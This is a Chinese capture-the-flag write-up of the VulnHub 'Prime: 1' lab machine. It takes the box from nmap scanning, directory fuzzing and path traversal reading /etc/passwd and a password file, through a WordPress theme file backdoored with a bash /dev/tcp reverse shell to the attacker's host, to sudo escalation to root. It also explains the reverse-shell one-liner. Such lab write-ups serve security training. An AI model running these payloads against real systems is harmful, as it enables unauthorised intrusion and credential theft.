# Prime主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/prime-1,358/
-   下载地址：https://download.vulnhub.com/prime/Prime_Series_Level-1.rar

## 信息收集

### 主机发现

```shell
└─$ nmap -sn 192.168.2.1/24               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 10:57 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00097s latency).
Nmap scan report for 192.168.2.2
Host is up (0.00086s latency).
Nmap scan report for 192.168.2.128
Host is up (0.00011s latency).
Nmap scan report for 192.168.2.131
Host is up (0.0011s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.39 seconds

```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口扫描

```
# TCP扫描
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.131 -oA Scan/sT
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 11:06 HKT
Nmap scan report for 192.168.2.131
Host is up (0.00062s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:F7:2C:7D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 18.39 seconds

# UDP扫描
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.131 -oA Scan/sU
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 11:07 HKT
Warning: 192.168.2.131 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.131
Host is up (0.00093s latency).
All 65535 scanned ports on 192.168.2.131 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:F7:2C:7D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 85.88 seconds

```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描
5.   `-oA`  将当前扫描出的内容保存到指定文件中

### 服务及操作系统扫描

```shell
└─$ sudo nmap -sC -sV -O -p22,80 --min-rate 10000 192.168.2.131 -oA Scan/sC        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 11:08 HKT
Nmap scan report for 192.168.2.131
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8dc52023ab10cadee2fbe5cd4d2d4d72 (RSA)
|   256 949cf86f5cf14c11957f0a2c3476500b (ECDSA)
|_  256 4bf6f125b61326d4fc9eb0729ff46968 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: HacknPentest
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:F7:2C:7D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds

```

参数讲解：

1.   `-sV` 探测当前的服务版本
2.   `-sC` 调用默认的脚本进行漏洞探测
3.   `-O` 探测目标操作系统版本
4.   `-p `  指定端口进行扫描

### 漏洞扫描

```shell
└─$ sudo nmap --script=vuln -p22,80 192.168.2.131 -oA Scan/Script             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 11:10 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.131
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:F7:2C:7D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.20 seconds

```

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

## web访问及扫描

-   访问默认页

-   ![image-20230518113742118](https://raw.githubusercontent.com/r0o983/images/main/image-20230518113742118.png)

-   调用`gobuster`进行目录扫描

-   ```shell
    └─$ sudo gobuster dir -u http://192.168.2.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.2.131
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2023/05/18 11:37:22 Starting gobuster in directory enumeration mode
    ===============================================================
    /wordpress            (Status: 301) [Size: 318] [--> http://192.168.2.131/wordpress/]
    /dev                  (Status: 200) [Size: 131]
    /javascript           (Status: 301) [Size: 319] [--> http://192.168.2.131/javascript/]
    /server-status        (Status: 403) [Size: 278]
    Progress: 219688 / 220561 (99.60%)
    ===============================================================
    2023/05/18 11:37:51 Finished
    ===============================================================
                                                                    
    ```

-   参数讲解：

    1.   `dir` 指定是以查找文件(文件夹)的形式进行扫描
    2.   `-u`  指定需要扫描的目标
    3.   `-w`  指定需要使用的字典文件进行目录扫描

-   ![image-20230518113948592](https://raw.githubusercontent.com/r0o983/images/main/image-20230518113948592.png)

-   一般情况下，`Wordpress`的后台路径都是`wp-admin`尝试登陆

-   ![image-20230518114057046](https://raw.githubusercontent.com/r0o983/images/main/image-20230518114057046.png)

-   使用`dirb`来进行二次扫描

-   ```shell
    └─$ dirb http://192.168.2.131/          
    
    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------
    
    START_TIME: Thu May 18 11:46:41 2023
    URL_BASE: http://192.168.2.131/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    
    -----------------
    
    GENERATED WORDS: 4612                                                          
    
    ---- Scanning URL: http://192.168.2.131/ ----
    + http://192.168.2.131/dev (CODE:200|SIZE:131)            
    + http://192.168.2.131/index.php (CODE:200|SIZE:136)           
    ==> DIRECTORY: http://192.168.2.131/javascript/                  
    + http://192.168.2.131/server-status (CODE:403|SIZE:278)          
    ==> DIRECTORY: http://192.168.2.131/wordpress/                                                                                             
    ---- Entering directory: http://192.168.2.131/javascript/ ----
    ==> DIRECTORY: http://192.168.2.131/javascript/jquery/                                                                                    
    ---- Entering directory: http://192.168.2.131/wordpress/ ----
    + http://192.168.2.131/wordpress/index.php (CODE:301|SIZE:0)     
    ==> DIRECTORY: http://192.168.2.131/wordpress/wp-admin/           
    ==> DIRECTORY: http://192.168.2.131/wordpress/wp-content/       
    ==> DIRECTORY: http://192.168.2.131/wordpress/wp-includes/      
    + http://192.168.2.131/wordpress/xmlrpc.php (CODE:405|SIZE:42)      
    ```
    
-   依次查看以上暴露出的文件![image-20230518114935144](https://raw.githubusercontent.com/r0o983/images/main/image-20230518114935144.png)

-   继续使用`gobuster`进行二次针对文件类型的扫描

-   >   参数：
    >
    >   -x 指定文件类型进行扫描，多个文件类型以逗号分隔

-   ![image-20230518115300758](https://raw.githubusercontent.com/r0o983/images/main/image-20230518115300758.png)

-   访问找出的`secret.txt`![image-20230518115426043](https://raw.githubusercontent.com/r0o983/images/main/image-20230518115426043.png)

-   根据以上[github][https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web]的提示页面使用`wfuzz`来进行扫描目录文件

    -   参数：--hw 过滤掉12个字符长度的扫描结果

-   ![image-20230518123523956](https://raw.githubusercontent.com/r0o983/images/main/image-20230518123523956.png)

-   ![image-20230518124022721](https://raw.githubusercontent.com/r0o983/images/main/image-20230518124022721.png)

-   根据提示访问`secrettier360`来进行访问![image-20230518145541792](https://raw.githubusercontent.com/r0o983/images/main/image-20230518145541792.png)

-   该网站存在任意文件读取漏洞

-   ```shell
    └─$ curl http://192.168.2.131/image.php?secrettier360=/../../../../../../../../../../../../../../etc/passwd            
    <html>
    <title>HacknPentest</title>
    <body>
     <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
    </body>
    finaly you got the right parameter<br><br><br><br>root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    syslog:x:104:108::/home/syslog:/bin/false
    _apt:x:105:65534::/nonexistent:/bin/false
    messagebus:x:106:110::/var/run/dbus:/bin/false
    uuidd:x:107:111::/run/uuidd:/bin/false
    lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
    whoopsie:x:109:117::/nonexistent:/bin/false
    avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
    avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
    dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
    colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
    speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
    hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
    kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
    pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
    rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
    saned:x:119:127::/var/lib/saned:/bin/false
    usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
    victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
    mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
    saket:x:1001:1001:find password.txt file in my directory:/home/saket:
    sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
    </html>
    
    ```

-   根据提示读取`password.txt` 

-   ```shell
    └─$ curl http://192.168.2.131/image.php?secrettier360=/../../../../../../../../../../../../../../home/saket/password.txt
    <html>
    <title>HacknPentest</title>
    <body>
     <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
    </body>
    finaly you got the right parameter<br><br><br><br>follow_the_ippsec
    </html>
    
    ```

-   尝试登陆`ssh`无果，访问`wordpress/wp-admin`可以进行登陆（账号：victor 密码：follow_the_ippsec)![image-20230518150952423](https://raw.githubusercontent.com/r0o983/images/main/image-20230518150952423.png)

-   找到可写的PHP文件，写入shell到该文件中，当前版本的主题中有一个默认主题为`Twenty Nineteen Version: 1.4` ，找到其中的`secret.php`文件，将反弹shell写入到该文件中

-   ![image-20230519154517659](https://raw.githubusercontent.com/r0o983/images/main/image-20230519154517659.png)

-   写入反弹shell`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.128/443 0>&1'") ?>`到文件中，本地发起监听。

    -   注：`http://<ip address>/wordpress/wp-content/themes/twentynineteen/secret.php` 为默认路径

-   ![image-20230519154949325](https://raw.githubusercontent.com/r0o983/images/main/image-20230519154949325.png)

### 获得shell

```shell
# 获得初始shell
└─$ nc -nvlp 443                                                
listening on [any] 443 ...
connect to [192.168.2.128] from (UNKNOWN) [192.168.2.131] 51020
bash: cannot set terminal process group (1445): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:f7:2c:7d brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.131/24 brd 192.168.2.255 scope global dynamic ens33
       valid_lft 1494sec preferred_lft 1494sec
    inet6 fe80::1597:a6f0:28a3:f906/64 scope link 
       valid_lft forever preferred_lft forever

www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ whoami
www-data

www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo -l
ludo - 
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 

```

-   查找有价值的目录或文件`backup,back_up,password.txt,user.txt`

-   ```shell
    www-data@ubuntu:/home/saket$ find / -name backup 2>/dev/null
    /opt/backup
    www-data@ubuntu:/home/saket$ cd /opt/backup
    www-data@ubuntu:/opt/backup$ ls
    server_database
    www-data@ubuntu:/opt/backup$ cd server_database
    www-data@ubuntu:/opt/backup/server_database$ ls
    backup_pass  {hello.8}
    www-data@ubuntu:/opt/backup/server_database$ cat ./*
    your password for backup_database file enc is 
    
    "backup_password"
    
    
    Enjoy!
    www-data@ubuntu:/opt/backup/server_database$ 
    
    ```

-   之前在尝试使用sudo打开enc文件时需要一个密码，尝试进行输入，发现多了两个文件

-   ![image-20230520090002148](https://raw.githubusercontent.com/r0o983/images/main/image-20230520090002148.png)

-   ```shell
    www-data@ubuntu:/home/saket$ cat enc.txt key.txt     
    nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
    I know you are the fan of ippsec.
    
    So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
    www-data@ubuntu:/home/saket$ 
    
    ```

-   进行编码获得`ippsec`的密文

-   ```shell
    └─$ echo -n ippsec | md5sum
    366a74cb3c959de17d61db30591c39d1  -
    
    # 将得到的16进制数进行格式化输出
    └─$ echo -n 366a74cb3c959de17d61db30591c39d1 |od -A n -t x1 
     33 36 36 61 37 34 63 62 33 63 39 35 39 64 65 31
     37 64 36 31 64 62 33 30 35 39 31 63 33 39 64 31
     
    # 将数据去除空格字符 sed s/[[::space:]]//g
    └─$ echo " 33 36 36 61 37 34 63 62 33 63 39 35 39 64 65 31 37 64 36 31 64 62 33 30 35 39 31 63 33 39 64 31" | sed s/[[:space:]]//g                    
    3336366137346362336339353964653137643631646233303539316333396431
    
    # 来自ChatGPT
    这段代码使用了`echo`和`od`命令来处理一个十六进制字符串。让我们逐步解释代码的原理：
    
    1. `echo -n 366a74cb3c959de17d61db30591c39d1`：这部分代码使用`echo`命令将指定的字符串打印到标准输出。`-n`选项告诉`echo`命令不要在末尾添加换行符。
    
    2. `|`：这是管道操作符，将`echo`命令的输出传递给下一个命令。
    
    3. `od -A n -t x1`：这部分代码使用`od`命令来将输入的字符串进行格式化输出。`-A n`选项告诉`od`命令不要在输出中显示地址偏移量，`-t x1`选项指定使用十六进制格式进行输出，每个字节用一个十六进制数字表示。
    
    因此，整个代码的作用是将输入的字符串`366a74cb3c959de17d61db30591c39d1`转换为一个以十六进制表示的格式化输出。每两个字符表示一个字节，输出结果类似于`36 6a 74 cb 3c 95 9d e1 7d 61 db 30 59 1c 39 d1`。这种格式化输出在某些情况下可能对于数据的处理和分析很有用，例如在调试或数据转换过程中。
    ```

-   尝试使用`base64`解密`enc.txt`文件内容

-   ```shell
    └─$ echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -aes-256-ecb -d -a -K 3336366137346362336339353964653137643631646233303539316333396431 | base64 | base64 -d 
    Dont worry saket one day we will reach to
    our destination very soon. And if you forget 
    your username then use your old password
    ==> "tribute_to_ippsec"
    
    Victor,
    
    
    # 来自ChatGPT
    这段代码涉及到了多个加密和解密步骤。让我们逐步解释每个步骤的原理：
    
    1. `"nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4="`：这是一个经过多次编码的字符串。它可能是经过加密、编码或其他方式处理过的数据。
    
    2. `openssl enc -aes-256-ecb -d -a -K 3336366137346362336339353964653137643631646233303539316333396431`：这是使用OpenSSL进行解密的步骤。`enc`是OpenSSL的命令行工具，`-aes-256-ecb`指定了使用AES-256加密算法的ECB模式，`-d`表示进行解密操作，`-a`表示输入和输出都是Base64编码的数据，`-K`后面的字符串是解密密钥。该命令将输入的字符串使用指定的密钥进行解密。
    
    3. `base64`：这是使用Base64进行编码或解码的命令。在这个步骤中，可能是对先前解密的数据进行了再次编码。
    
    4. `base64 -d`：这是对Base64编码的数据进行解码的命令。在这个步骤中，可能是对先前编码的数据进行了解码。
    
    综上所述，这段代码的主要目的是对经过多次编码和加密的数据进行解密和解码操作，以还原原始数据。然而，具体使用的加密算法、密钥和编码方式需要进一步了解才能确定解码后的结果和原始数据的含义。
    ```

-   切换到`saket`用户,并尝试提权

-   ```shell
    www-data@ubuntu:/var/www$ su saket
    su saket
    su: must be run from a terminal
    www-data@ubuntu:/var/www$ python -c 'import pty;pty.spawn("/bin/bash")';
    python -c 'import pty;pty.spawn("/bin/bash")';
    www-data@ubuntu:/var/www$ su saket
    su saket
    Password: tribute_to_ippsec
    
    saket@ubuntu:/var/www$ sudo -l
    sudo -l
    Matching Defaults entries for saket on ubuntu:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User saket may run the following commands on ubuntu:
        (root) NOPASSWD: /home/victor/undefeated_victor
    saket@ubuntu:/var/www$ sudo /home/victor/undefeated_victor
    sudo /home/victor/undefeated_victor
    if you can defeat me then challenge me in front of you
    
    root@ubuntu:/var/www# ls
    ls
    html
    root@ubuntu:/var/www# stty raw -echo
    stty raw -echo
    root@ubuntu:/var/www# ls
    html
    root@ubuntu:/var/www# cd /root
    root@ubuntu:/root# ls
    enc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql
    root@ubuntu:/root# cat root.txt
    b2b17036da1de94cfb024540a8e7075a
    root@ubuntu:/root# 
    
    
    ```





建立反弹shell之Notes：

`bash -i &> /dev/tcp/192.168.2.128/1234 0>&1 `

这段代码的目的是在Bash中建立一个网络连接，并将该连接的输入和输出重定向到指定的IP地址和端口。

1. `bash -i`：这部分启动了一个交互式的Bash shell。`-i`选项表示以交互模式运行Bash，使得我们能够与shell进行交互。

2. `&>`：这部分是重定向语法，将标准输出和标准错误输出都重定向到后面指定的位置。在这种情况下，`&>`将输出重定向到特殊设备文件`/dev/tcp/192.168.2.128/1234`。

3. `/dev/tcp/192.168.2.128/1234`：这是一个特殊的设备文件路径，在Bash中可用于进行网络连接。这里的`192.168.2.128`是目标服务器的IP地址，`1234`是目标服务器上监听的端口号。通过重定向输出到该设备文件，我们实际上将建立一个与目标服务器的网络连接。

4. `0>&1`：这部分将标准输入（文件描述符0）重定向到标准输出（文件描述符1）。这意味着我们将输入也重定向到网络连接，使得我们能够在连接上发送命令和数据。

因此，整个代码的作用是在本地机器上通过Bash启动一个与目标服务器的网络连接，并将输入和输出都重定向到该连接，以实现与目标服务器的交互。这种技术通常被用于远程控制和执行命令，但需要注意这种用法可能涉及到安全和合法性的问题。
